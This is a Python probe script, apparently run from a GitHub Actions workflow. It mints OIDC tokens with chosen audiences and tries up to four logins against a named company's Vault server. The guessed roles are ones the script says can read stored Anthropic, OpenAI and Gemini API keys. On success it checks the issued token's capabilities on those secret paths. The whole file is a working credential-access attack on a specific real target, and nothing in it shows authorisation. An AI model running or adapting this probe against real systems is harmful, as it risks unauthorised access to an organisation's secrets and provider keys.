#!/usr/bin/env python3
"""11998 probe2: bounded candidate-role test against the role that MUST read the AI-key KV paths.

Repo SonarSource/sonar-eval-agentic workflow reads
  development/kv/data/codenext/eval/{anthropic,openai,gemini} field=credential
so its jwt-ghwf role (derived name) has a policy reaching real AI provider keys.
We test <=4 logins with ONLY mintable audiences (bare org name / vault host) to learn:
  ROLE_NOT_FOUND  -> role name wrong/absent
  AUD_MISMATCH    -> role exists but has bound_audiences (gate holds)
  BOUND_CLAIMS    -> role has no audience restriction -> only claims gate remains (dangerous)
  token issued    -> direct compromise
Read-only; no KV read unless a token is issued (then capabilities-self only).
"""
import base64, json, os, urllib.error, urllib.parse, urllib.request

VAULT = "https://vault.sonar.build"
RESULT = {"probe": "11998-candidate-role"}
ROLES = [
    "github-sonarsource-sonar-eval-agentic",
    "github-sonarsource-sonar-eval-agentic-protected",
]
AUDS = [("bare_org", "SonarSource"), ("bare_vault", "vault.sonar.build")]


def http(method, url, data=None, headers=None, timeout=25):
    h = {"User-Agent": "oidc-vault-probe-11998b"}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"status": r.status, "body": r.read(300000)}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": e.read(300000)}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {str(e)[:300]}"}


def jb(r):
    try:
        return json.loads(r["body"].decode("utf-8", "replace")) if r.get("body") else None
    except Exception:
        return {"_raw": (r.get("body") or b"")[:800].decode("utf-8", "replace")}


def errs(j):
    if isinstance(j, dict) and isinstance(j.get("errors"), list):
        return "; ".join(str(x) for x in j["errors"])[:600]
    return json.dumps(j)[:600] if j is not None else None


def mint(aud):
    url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
    tok = os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]
    u = url + ("&" if "?" in url else "?") + "audience=" + urllib.parse.quote(aud, safe="")
    r = http("GET", u, headers={"Authorization": "Bearer " + tok}, timeout=30)
    j = jb(r)
    return (j or {}).get("value") if isinstance(j, dict) else None


def main():
    r = http("GET", VAULT + "/v1/sys/health")
    RESULT["vault_health"] = r["status"]
    result_tokens = {}
    for name, aud in AUDS:
        jwt = mint(aud)
        result_tokens[name] = {"aud": aud, "minted": bool(jwt)}
        if not jwt:
            continue
    RESULT["logins"] = []
    n = 0
    issued_token = None
    for name, aud in AUDS:
        jwt = mint(aud)
        if not jwt:
            continue
        for role in ROLES:
            if n >= 4:
                break
            r = http("POST", VAULT + "/v1/auth/jwt-ghwf/login", data={"jwt": jwt, "role": role})
            j = jb(r)
            iss = bool(isinstance(j, dict) and isinstance(j.get("auth"), dict) and j["auth"].get("client_token"))
            RESULT["logins"].append({"aud": name, "role": role, "status": r["status"],
                                     "issued": iss, "vault_error": errs(j)})
            n += 1
            if iss:
                issued_token = j["auth"]["client_token"]
                break
        if issued_token:
            break
    if issued_token:
        H = {"X-Vault-Token": issued_token, "X-Vault-Request": "true"}
        RESULT["lookup_self"] = jb(http("GET", VAULT + "/v1/auth/token/lookup-self", headers=H))
        RESULT["capabilities_self"] = jb(http("POST", VAULT + "/v1/sys/capabilities-self",
                                              data={"paths": [
                                                  "development/kv/data/codenext/eval/anthropic",
                                                  "development/kv/data/codenext/eval/openai",
                                                  "development/kv/data/codenext/eval/gemini",
                                                  "development/kv/data/code-security-diff-val-claude-code"]},
                                              headers=H))
    print("===RESULT_JSON===")
    print(json.dumps(RESULT, indent=1)[:12000])


main()
